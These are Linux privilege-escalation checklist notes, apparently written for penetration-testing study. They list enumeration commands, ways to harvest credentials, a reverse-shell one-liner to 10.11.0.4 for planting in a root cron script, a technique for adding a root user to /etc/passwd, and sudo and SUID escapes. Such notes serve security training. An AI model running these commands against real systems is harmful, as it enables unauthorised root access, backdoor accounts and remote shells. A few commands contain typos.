# 1. Find system info for kernel exploits
- [ ] hostname
- [ ] cat /etc/issue
- [ ] uname -a
- [ ] arch

# 2. Situational Awareness - Manual
- [ ] id  (user info)
- [ ] cat /etc/password (users list)
- [ ] whoami
- [ ] ps aux (running process list) (BETTER run PSPY)
- [ ] ip a (network interface info)
- [ ] route or routel (routing table)
- [ ] ss -anp  (listening ports)
- [ ] cat /etc/iptables/rules.v4  (firewall rules)
- [ ] ls -lah /etc/cron*  (cron jobs)
- [x] crontab -l  (cron jobs)
- [ ] sudo crontab -l (cron jobs)
- [ ] dpkg -l  (list applications installed with dpkg)
- [ ] find / -writable -type d 2>/dev/null   (Find writeable paths for the current user:)
- [ ] cat /etc/fstab (lists all drives that will be mounted at boot time)
- [ ] lsblk  (view all disk available)
- [ ] lsmod (list loaded kernel modules)
- [ ]  /sbin/modinfo modulename (find info and version of a specific module)
- [x] find / -perm -u=s -type f 2>/dev/null  (find files with SUID enabled)
- [x] find / -type f -name \*backup\*  2>/dev/null (look for hidden backup files)
- [x] check id_ecdsa and id_Rsa
- [ ] Always always look for the **"Unknown SUID binary!"** alert in SUID, its most probably the right path.
#### Interactive shell
```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

ctrl z

stty raw -echo && fg

export TERM=xterm-256color

```
# 3. Automated Enum
- [ ] ./unix-privesc-check standard > output.txt
- [ ] ./linpeas.sh
- [ ] ./LinEmun/sh

# 4. Exposed Confidential Information
- [ ] env (Check info exposed in environment variables)
- [ ] cat .bashrc  (check scripts running at boot time)
- [ ] Listen for processtraffic revealing passwords 
```
watch -n 1 "ps -aux | grep pass"
```
- [ ] Listen for network traffic revealing passwords:
```
sudo tcpdump -i lo -A | grep "pass"
```
- [ ] Look for common configuration files
```
find \ -type f -name logs.txt, log.txt, debug.log, *.log, *.config, *.ini 2>/dev/null
```
# 5. Insecure FilePermission

- [ ] Check if there's a cronjob running a script as root that the current user can modify!
```
List cronjobs from the syslogs
	grep "CRON" /var/log/syslog
Onliner reverse shell to add to a .sh script:
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f 
```
- [ ] Check if we can modify /etc/passwd. If so, add a new user with a new password like this:
```
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```

# 6. Insecure System Components

- [ ] Check if you can abuse any **SUID** binary from GTFObins
- [ ] Check for **capabilities** that could be abused
```
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
- [ ] Check which binaries can be run as ROOT by the user, be  aware that apparmor could block some actions. Check syslog to see if apparmor is blocking your app **'cat /var/log/syslog | grep appname'**
```
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
```
joe@debian-privesc:~$ sudo apt-get changelog apt
...
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```

- [ ] Check **weird permissions on /bin/sh** or /bin/bash. **Usually /bin/bash does not have the setuid bit set** .If suid is set on /bin/bash, simply type "`/bin/bash -p`" to get root!!

- [ ] Finally, use the system info gather about the kernel or any application version to find a publicly available exploit. 
- [ ] 

Example searchsploit search:
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

### Useful enumeration commands

- [ ] Use grep to find where a particular executable that you can replace is being called from. e.g. (find what service or file (most likely under /etc/) is calling "rare_executable" ) `grep -r "/home/user/rare_executable" /etc/` . If files are located in you /home/user directory, you can always replace them although they are not writable or owned by root.